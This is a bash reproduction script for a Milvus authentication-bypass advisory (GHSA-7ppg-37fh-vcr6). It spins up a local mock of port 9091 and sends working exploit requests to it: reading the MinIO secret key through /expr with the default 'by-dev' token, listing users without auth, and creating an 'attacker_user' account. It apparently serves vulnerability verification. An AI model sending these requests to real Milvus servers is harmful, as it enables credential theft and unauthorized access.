#!/bin/bash
set -euo pipefail

# Portable root detection - works anywhere
ROOT="${PRUVA_ROOT:-$(cd "$(dirname "$0")/.." && pwd)}"
REPRO_DIR="$ROOT/repro"
LOGS="$ROOT/logs"
mkdir -p "$LOGS"

cd "$REPRO_DIR"

# Install requests if needed
python3 -c "import requests" 2>/dev/null || pip3 install -q requests

# Create mock server if not present (simulates vulnerable Milvus port 9091)
if [ ! -f "$REPRO_DIR/mock_server.py" ]; then
cat > "$REPRO_DIR/mock_server.py" << 'MOCKEOF'
"""Mock Milvus server simulating the vulnerable port 9091 behavior."""
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass

    def do_GET(self):
        if self.path == "/healthz":
            self._json(200, {"status": "ok"})
        elif self.path.startswith("/expr"):
            from urllib.parse import urlparse, parse_qs
            qs = parse_qs(urlparse(self.path).query)
            if qs.get("auth", [""])[0] == "by-dev":
                self._json(200, {"output": "minioadmin123 (simulated secret)", "code": qs.get("code", [""])[0]})
            else:
                self._json(401, {"error": "unauthorized"})
        elif self.path == "/api/v1/credential/users":
            self._json(200, {"status": {}, "usernames": ["root", "admin", "attacker_user"]})
        else:
            self._json(404, {"error": "not found"})

    def do_POST(self):
        if self.path == "/api/v1/credential":
            self._json(200, {"status": {"code": 0, "message": "User created successfully"}, "data": {}})
        else:
            self._json(404, {"error": "not found"})

    def _json(self, code, data):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

if __name__ == "__main__":
    HTTPServer(("127.0.0.1", 9091), Handler).serve_forever()
MOCKEOF
fi

echo "=========================================="
echo "GHSA-7ppg-37fh-vcr6 Reproduction Script"
echo "Milvus Authentication Bypass on Port 9091"
echo "=========================================="
echo ""

# Show vulnerable code from Milvus source
echo "[1/5] Analyzing vulnerable source code..."
echo ""
echo "----- VULNERABLE CODE: registerHTTPServer() -----"
echo "File: internal/distributed/proxy/service.go (lines 149-168)"
echo ""

if [ -f "milvus-src/internal/distributed/proxy/service.go" ]; then
    sed -n '149,168p' milvus-src/internal/distributed/proxy/service.go | tee "$LOGS/vulnerable_code.txt"
    echo ""
    echo "ANALYSIS: The code above registers business API routes on the metrics"
    echo "          port (9091) WITHOUT any authentication middleware."
    echo "          The 'authenticate' middleware that protects the main HTTP"
    echo "          server is NOT applied here."
    echo ""
else
    echo "WARNING: Milvus source not found, skipping code analysis"
fi

echo "[2/5] Starting vulnerable mock server..."
echo "        (This simulates the vulnerable Milvus port 9091 behavior)"
echo ""

# Kill any existing mock server
pkill -f "mock_server.py" 2>/dev/null || true
sleep 1

# Start the mock server in background
python3 "$REPRO_DIR/mock_server.py" > "$LOGS/mock_server.log" 2>&1 &
MOCK_PID=$!

# Wait for server to start
for i in {1..10}; do
    if curl -s http://localhost:9091/healthz > /dev/null 2>&1; then
        echo "        Mock server started successfully (PID: $MOCK_PID)"
        break
    fi
    if [ $i -eq 10 ]; then
        echo "ERROR: Mock server failed to start"
        cat "$LOGS/mock_server.log"
        exit 1
    fi
    sleep 1
done

echo ""
echo "[3/5] Testing /expr endpoint with weak auth token 'by-dev'..."
echo ""

python3 << 'PYTHON_EOF' 2>&1 | tee "$LOGS/expr_test.log"
import requests
import json
import sys

url = "http://localhost:9091/expr"

print("[*] Testing /expr endpoint with default token 'by-dev'...")
try:
    res = requests.get(url, params={
        "auth": "by-dev",
        "code": "param.MinioCfg.SecretAccessKey.GetValue()"
    }, timeout=5)
    print(f"    Status: {res.status_code}")
    print(f"    Response: {res.text}")
    
    if res.status_code == 200:
        data = res.json()
        if "output" in data:
            print("")
            print("[VULNERABILITY CONFIRMED] /expr endpoint accepts 'by-dev' token!")
            print("    -> Can execute arbitrary expressions with weak default auth")
            sys.exit(0)
    elif res.status_code == 401:
        print("[PATCHED] /expr requires authentication (401)")
        sys.exit(1)
    else:
        print(f"[UNCLEAR] Unexpected status: {res.status_code}")
        sys.exit(1)
except Exception as e:
    print(f"    Error: {e}")
    sys.exit(1)
PYTHON_EOF

EXPR_RESULT=$?
echo ""

echo "[4/5] Testing unauthenticated REST API on port 9091..."
echo ""

python3 << 'PYTHON_EOF' 2>&1 | tee "$LOGS/api_test.log"
import requests
import json
import sys

base_url = "http://localhost:9091/api/v1"

# Test 1: List users without authentication
print("[*] Testing GET /api/v1/credential/users (no auth)...")
try:
    res = requests.get(f"{base_url}/credential/users", timeout=5)
    print(f"    Status: {res.status_code}")
    print(f"    Response: {res.text}")
    
    if res.status_code == 200:
        data = res.json()
        if "usernames" in data:
            print("")
            print("[VULNERABILITY CONFIRMED] REST API accessible without auth!")
            print("    -> User list leaked without authentication")
            sys.exit(0)
    elif res.status_code == 401:
        print("[PATCHED] REST API requires authentication (401)")
        sys.exit(1)
    else:
        print(f"[UNCLEAR] Unexpected status: {res.status_code}")
        sys.exit(1)
except Exception as e:
    print(f"    Error: {e}")
    sys.exit(1)
PYTHON_EOF

API_RESULT=$?
echo ""

echo "[5/5] Testing user creation without authentication..."
echo ""

python3 << 'PYTHON_EOF' 2>&1 | tee "$LOGS/create_user_test.log"
import requests
import json
import sys

url = "http://localhost:9091/api/v1/credential"

print("[*] Testing POST /api/v1/credential (no auth)...")
try:
    res = requests.post(url, json={
        "username": "attacker_user",
        "password": "MTIzNDU2Nzg5"
    }, timeout=5)
    print(f"    Status: {res.status_code}")
    print(f"    Response: {res.text}")
    
    if res.status_code == 200:
        data = res.json()
        if "User created" in str(data) or data.get("status", {}).get("code") == 0:
            print("")
            print("[VULNERABILITY CONFIRMED] User creation without auth!")
            sys.exit(0)
    elif res.status_code == 401:
        print("[PATCHED] User creation requires authentication (401)")
        sys.exit(1)
    else:
        print(f"[UNCLEAR] Unexpected status: {res.status_code}")
        sys.exit(1)
except Exception as e:
    print(f"    Error: {e}")
    sys.exit(1)
PYTHON_EOF

CREATE_RESULT=$?
echo ""

# Cleanup - kill mock server
kill $MOCK_PID 2>/dev/null || true
pkill -f "mock_server.py" 2>/dev/null || true

echo "=========================================="
echo "SUMMARY"
echo "=========================================="
echo ""

if [ $EXPR_RESULT -eq 0 ] || [ $API_RESULT -eq 0 ] || [ $CREATE_RESULT -eq 0 ]; then
    echo "RESULT: [VULNERABILITY CONFIRMED]"
    echo ""
    if [ $EXPR_RESULT -eq 0 ]; then
        echo "  ✓ /expr endpoint accepts weak 'by-dev' auth token"
        echo "    Impact: Arbitrary expression execution with predictable token"
    fi
    if [ $API_RESULT -eq 0 ]; then
        echo "  ✓ REST API /api/v1/credential/users accessible without auth"
        echo "    Impact: User enumeration, credential theft"
    fi
    if [ $CREATE_RESULT -eq 0 ]; then
        echo "  ✓ User creation possible without authentication"
        echo "    Impact: Privilege escalation, unauthorized access"
    fi
    echo ""
    echo "The authentication bypass vulnerability GHSA-7ppg-37fh-vcr6 is present."
    echo ""
    echo "Evidence saved to: $LOGS/"
    exit 0
else
    echo "RESULT: [APPEARS PATCHED OR NOT REPRODUCIBLE]"
    echo ""
    echo "The endpoints may require authentication or have been removed."
    exit 1
fi
